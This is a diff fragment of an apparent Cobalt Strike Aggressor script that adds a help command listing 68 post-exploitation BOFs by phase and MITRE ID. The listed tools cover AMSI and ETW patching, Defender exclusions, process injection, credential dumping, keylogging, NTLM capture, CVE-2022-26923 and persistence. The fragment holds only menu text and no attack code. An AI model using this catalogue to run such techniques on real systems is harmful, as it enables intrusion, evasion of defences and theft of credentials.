+    blog($bid, "  netstat        T1049     TCP/UDP connections");
+    blog($bid, "  netuser        T1087.*   Local/domain users       [hostname]");
+    blog($bid, "  netshare       T1135     SMB shares               [hostname]");
+    blog($bid, "  netloggedon    T1033     Logged-on users          [hostname]");
+    blog($bid, "  tasklist       T1057     Process list (indirect NtQSI)");
+    blog($bid, "  schtasksquery  T1053.005 Scheduled tasks via COM  [host] [path]");
+    blog($bid, "  reg-query      T1012     Registry read            <hive> <key>");
+    blog($bid, "  windowlist     T1010     Window enum              [visible:0|1]");
+    blog($bid, "  routeprint     T1016     Routing table");
+    blog($bid, "  ldapsearch     T1087.*   LDAP query               <dn> <filter> [attrs]");
+    blog($bid, "  nonpaged-ldapsearch T1087 Non-paged LDAP          <dn> <filter>");
+    blog($bid, "  adcs-enum-com  T1518.001 ADCS templates via COM");
+    blog($bid, "  list-firewall  T1518.001 Firewall rules");
+    blog($bid, "  enum-filter-driver T1518 Mini-filter drivers");
+    blog($bid, "  wmi-query      T1047     WMI query                <ns> <wql>");
+    blog($bid, "  get-dpapi-system T1555.4 DPAPI system master key");
+    blog($bid, "  clipboard      T1115     Clipboard dump");
+    blog($bid, "  dnscache       T1016.001 DNS cache");
+    blog($bid, "  driversigs     T1518.001 Driver signatures");
+    blog($bid, "  findmodule     T1057     Module in remote PID     <pid> <module>");
+    blog($bid, "  sccm-decrypt   T1555     SCCM NAA creds");
+    blog($bid, "  ldapsec-check  T1518     LDAP signing probe");
+    blog($bid, "");
+    blog($bid, "PHASE 3 — Remote Ops (18 BOFs)");
+    blog($bid, "  portscan       T1046     TCP scan                 <host> <ports>");
+    blog($bid, "  etw-patch      T1562.006 Patch EtwEventWrite");
+    blog($bid, "  amsi-patch     T1562.001 Patch AmsiScanBuffer");
+    blog($bid, "  enablepriv     T1134.002 Enable token privilege   <privname>");
+    blog($bid, "  procdump       T1003.001 MiniDump process         <pid> <outpath>");
+    blog($bid, "  ghost-task     T1053.005 Hidden sched task        <name> <cmd> [remove]");
+    blog($bid, "  reg-save       T1003.002 Reg hive dump            <hive> <key> <out>");
+    blog($bid, "  sc-create      T1543.003 Create service           <name> <bin>");
+    blog($bid, "  sc-delete      T1489     Delete service           <name>");
+    blog($bid, "  adduser        T1136.001 Add local user           <user> <pass> [admin]");
+    blog($bid, "  make-token     T1134.003 Make impersonation token <dom> <user> <pass>");
+    blog($bid, "  shspawnas      T1134.002 Spawn as user            <dom> <user> <pass> <cmd>");
+    blog($bid, "  suspendresume  T1055     Suspend/resume process   <pid> <action>");
+    blog($bid, "  global-unprotect T1555.3 DPAPI Chrome decrypt     <ciphertext-hex>");
+    blog($bid, "  inject-crt     T1055.002 CreateRemoteThread inject <pid> <sc-hex>");
+    blog($bid, "  inject-ntcreate T1055   NtCreateThreadEx inject  <pid> <sc-hex>");
+    blog($bid, "  inject-apc     T1055.004 APC inject               <pid> <sc-hex>");
+    blog($bid, "  inject-ktable  T1055     KernelCallbackTable inject <pid> <sc-hex>");
+    blog($bid, "");
+    blog($bid, "PHASE 4 — OperatorsKit (12 BOFs)");
+    blog($bid, "  inject-poolparty T1055   PoolParty inject         <pid> <sc-hex>");
+    blog($bid, "  execute-crosssession T1021.003 Cross-session COM  <sessid> <cmd>");
+    blog($bid, "  dcom-localserver32 T1021.003 DCOM lateral         <host> <clsid>");
+    blog($bid, "  keylogger-rawinput T1056.001 Raw Input keylogger");
+    blog($bid, "  enum-sec-products T1518.001 AV/EDR detection");
+    blog($bid, "  enum-sysmon    T1518.001 Sysmon detection");
+    blog($bid, "  spn            T1558.003 SPN enum (stub)          [no args]");
+    blog($bid, "  wifi-passwords T1555     WLAN profile passwords");
+    blog($bid, "  cred-prompt    T1056.002 Credential UI prompt     [title] [msg]");
+    blog($bid, "  add-exclusion  T1562.001 Defender path exclusion  <path>");
+    blog($bid, "  capture-netntlm T1187    NetNTLMv2 capture        <unc-path>");
+    blog($bid, "  authenticate-http T1187  Outbound NTLM HTTP auth  <url>");
+    blog($bid, "");
+    blog($bid, "PHASE 4 — C2-Collection (8 BOFs)");
+    blog($bid, "  psx            T1057/34  Process+token+secprods (indirect sc)");
+    blog($bid, "  psk            T1518.001 Kernel drivers + sec products");
+    blog($bid, "  psm            T1057     Process modules via PEB walk");
+    blog($bid, "  findobjects    T1057     Safe injection targets");
+    blog($bid, "  kerberoast     T1558.003 Kerberoast tickets (stub) [no args]");
+    blog($bid, "  lapsdump       T1555     LAPS passwords from AD");
+    blog($bid, "  wdtoggle       T1003.001 Enable WDigest caching");
+    blog($bid, "  cve-2022-26923 T1068     AD CS dNSHostName spoof  <machinacct> <pass>");
+    blog($bid, "");
+    blog($bid, "PHASE 5 — Persistence (2 BOFs, by Dani)");
+    blog($bid, "  schtask-com    T1053.005 Sched task via COM       <name> <cmd> [trig] [rm]");
+    blog($bid, "  lnk-startup    T1547.001 Startup LNK via COM      <name> <target> [args] [rm]");
+    blog($bid, "");
+    blog($bid, "PHASE 6 — Loader (1 BOF)");
+    blog($bid, "  bofx                     OPSEC BOF loader         <path> [entry] [args]");
+    blog($bid, "");
+    blog($bid, "Use 'help <command>' for full syntax and MITRE details.");
+    blog($bid, "=================================================================");
+}
+beacon_command_register(
+    "dani-help",
+    "List all 68 BOFs in the Dani suite by phase and technique",
+    "Synopsis: dani-help\n\n" .
+    "Description: Print a structured list of all 68 BOFs available in the\n" .
+    "DEF-Situational-Awareness-BOF suite, organized by phase, with MITRE\n" .
+    "ATT&CK technique IDs and argument summaries.\n\n" .
+    "Use 'help <command>' for full syntax and MITRE details on any BOF.\n\n" .
+    "Args: none"
+);
